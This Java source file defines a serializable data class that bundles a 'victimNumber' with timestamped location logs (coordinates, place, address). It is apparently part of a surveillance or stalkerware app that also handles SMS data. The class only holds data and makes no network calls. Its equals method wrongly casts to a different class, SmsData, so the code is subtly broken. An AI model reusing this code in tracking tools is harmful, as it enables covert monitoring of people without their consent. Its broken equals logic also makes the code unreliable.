package com.sunnet.service.task.vo;

import com.google.gson.annotations.SerializedName;
import com.sunnet.service.db.entity.LocationEntity;
import com.sunnet.service.util.Utils;

import java.io.Serializable;
import java.util.List;

/**
 * All software created will be owned by
 * Patient Doctor Technologies, Inc. in USA
 */
public class LocationData implements Serializable {
    @SerializedName("victimNumber")
    public String victimNumber;
    @SerializedName("logs")
    public List<Logs> logsList;

    public static class Logs {
        @SerializedName("lat")
        public String lat;
        @SerializedName("lng")
        public String lng;
        @SerializedName("place")
        public String place;
        @SerializedName("address")
        public String address;
        @SerializedName("timestamp")
        public long timestamp;

        public Logs(LocationEntity location) {
            lat = location.getLatitude();
            lng = location.getLongitude();
            place = location.getPlace();
            address = location.getAddress();
            timestamp = Long.parseLong(location.getDate());
        }
    }

    @Override
    public boolean equals(Object o) {
        SmsData other = (SmsData) o;
        return Utils.isFullTextSearch2(victimNumber, other.victimNumber);
    }
}
